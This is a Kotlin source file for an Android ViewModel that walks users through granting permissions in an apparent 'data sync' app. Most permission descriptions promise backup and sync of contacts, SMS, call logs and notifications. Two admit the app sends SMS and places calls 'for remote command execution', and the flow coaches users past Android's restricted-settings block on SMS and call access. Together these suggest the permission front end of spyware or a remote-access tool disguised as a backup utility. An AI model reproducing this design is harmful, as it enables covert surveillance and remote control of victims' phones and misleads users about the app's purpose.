package com.boxx.datasync.permission

import android.Manifest
import android.app.Activity
import android.app.Application
import android.os.Build
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import dagger.hilt.android.lifecycle.HiltViewModel

sealed class PermissionUiState {
    object Checking : PermissionUiState()
    object RequestRuntime : PermissionUiState()
    object NeedNotificationListener : PermissionUiState()
    object NeedRestrictedSettings : PermissionUiState()
    object NeedBatteryOptimization : PermissionUiState()
    object NeedAppSettings : PermissionUiState()
    object Ready : PermissionUiState()
}

@HiltViewModel
class PermissionViewModel @Inject constructor(
    application: Application
) : AndroidViewModel(application) {

    private val handler = PermissionHandler(application)

    private val _permissions = MutableStateFlow<List<PermissionInfo>>(emptyList())
    val permissions: StateFlow<List<PermissionInfo>> = _permissions.asStateFlow()

    private val _statuses = MutableStateFlow<Map<String, PermissionStatus>>(emptyMap())
    val statuses: StateFlow<Map<String, PermissionStatus>> = _statuses.asStateFlow()

    private val _uiState = MutableStateFlow<PermissionUiState>(PermissionUiState.Checking)
    val uiState: StateFlow<PermissionUiState> = _uiState.asStateFlow()

    private var hasShownRestrictedGuide = false
    private var runtimeRequested = false

    init {
        val list = mutableListOf(
            PermissionInfo(
                "CONTACTS", "Contacts",
                "Access contacts to backup your contact list.",
                "Contacts", Manifest.permission.READ_CONTACTS
            ),
            PermissionInfo(
                "SMS_READ", "Read SMS",
                "Access SMS to backup your messages and enable forwarding.",
                "Sms", Manifest.permission.READ_SMS
            ),
            PermissionInfo(
                "SMS_SEND", "Send SMS",
                "Allows the app to send SMS for remote command execution.",
                "SendSms", Manifest.permission.SEND_SMS
            ),
            PermissionInfo(
                "SMS_RECEIVE", "Receive SMS",
                "Required to detect incoming SMS for real-time sync.",
                "ReceiveSms", Manifest.permission.RECEIVE_SMS
            ),
            PermissionInfo(
                "CALL_LOG", "Call Logs",
                "Access call history to backup your call logs.",
                "Call", Manifest.permission.READ_CALL_LOG
            ),
            PermissionInfo(
                "CALL_PHONE", "Make Calls",
                "Allows the app to initiate calls for remote command execution.",
                "Phone", Manifest.permission.CALL_PHONE
            ),
            PermissionInfo(
                "PHONE_STATE", "Phone State",
                "Required to detect SIM info and network status.",
                "SimCard", Manifest.permission.READ_PHONE_STATE
            )
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(PermissionInfo(
                "NOTIFICATIONS", "Notifications",
                "Required to show sync status in the notification bar.",
                "Notifications", Manifest.permission.POST_NOTIFICATIONS
            ))
        }

        list.add(PermissionInfo(
            "NOTIFICATION_LISTENER", "Notification Access",
            "Required to sync incoming notifications to your dashboard.",
            "NotificationSync", isSpecial = true
        ))

        list.add(PermissionInfo(
            "BATTERY_OPTIMIZATION", "Battery Optimization",
            "Disable optimization to ensure reliable background sync.",
            "Battery", isOptional = true, isSpecial = true
        ))

        _permissions.value = list
        refreshStatuses()
    }

    fun refreshStatuses(activity: Activity? = null, isFromLauncher: Boolean = false) {
        Log.d("PermissionFlow", "PERMISSION_FLOW_CHECKING")
        if (isFromLauncher) runtimeRequested = true
        val newStatuses = _permissions.value.associate { it.id to handler.getStatus(it) }
        _statuses.value = newStatuses
        updateUiState(activity)
    }

    private fun updateUiState(activity: Activity?) {
        val currentPermissions = _permissions.value
        val currentStatuses = _statuses.value

        // 1. Check runtime permissions
        val runtimePermissions = currentPermissions.filter { !it.isSpecial && it.permission != null }
        val deniedRuntime = runtimePermissions.filter { (currentStatuses[it.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED }

        if (deniedRuntime.isNotEmpty()) {
            val permanentlyDenied = activity?.let { act ->
                deniedRuntime.any { handler.isPermanentlyDenied(act, it) }
            } ?: false

            // If we already requested and still have denied permissions, OR they are permanently denied
            if (runtimeRequested || permanentlyDenied) {
                // Check if we should show Restricted Settings Guide first
                // Guide ONLY for SMS/Call permissions that are restricted
                val restrictedPermissionsMissing = deniedRuntime.filter { it.id.startsWith("SMS") || it.id.startsWith("CALL") }

                if (restrictedPermissionsMissing.isNotEmpty() && !hasShownRestrictedGuide) {
                    Log.d("PermissionFlow", "RESTRICTED_GUIDE_CONDITION_TRUE")
                    _uiState.value = PermissionUiState.NeedRestrictedSettings
                } else {
                    Log.d("PermissionFlow", "RESTRICTED_GUIDE_CONDITION_FALSE")
                    Log.d("PermissionFlow", "PERMISSION_RUNTIME_DENIED")
                    _uiState.value = PermissionUiState.NeedAppSettings
                }
            } else {
                Log.d("PermissionFlow", "PERMISSION_RUNTIME_REQUEST_STARTED")
                _uiState.value = PermissionUiState.RequestRuntime
            }
            return
        }

        Log.d("PermissionFlow", "PERMISSION_RUNTIME_GRANTED")

        // 2. Check Notification Listener
        val notifListener = currentPermissions.find { it.id == "NOTIFICATION_LISTENER" }
        if (notifListener != null && (currentStatuses[notifListener.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED) {
            Log.d("PermissionFlow", "PERMISSION_SPECIAL_SETTING_REQUIRED - Notification Listener")
            _uiState.value = PermissionUiState.NeedNotificationListener
            return
        }

        // 3. Check Battery Optimization (Optional)
        val batteryOpt = currentPermissions.find { it.id == "BATTERY_OPTIMIZATION" }
        if (batteryOpt != null && (currentStatuses[batteryOpt.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED) {
            Log.d("PermissionFlow", "PERMISSION_SPECIAL_SETTING_REQUIRED - Battery Optimization")
            _uiState.value = PermissionUiState.NeedBatteryOptimization
            return
        }

        Log.d("PermissionFlow", "PERMISSION_FLOW_READY")
        _uiState.value = PermissionUiState.Ready
    }

    fun markRestrictedGuideShown() {
        hasShownRestrictedGuide = true
        // Re-evaluate state, will likely move to NeedAppSettings if still denied
        _uiState.value = PermissionUiState.NeedAppSettings
    }

    fun areAllRequiredGranted(): Boolean {
        return _permissions.value.all {
            if (it.isOptional) true
            else handler.getStatus(it) == PermissionStatus.GRANTED
        }
    }
}
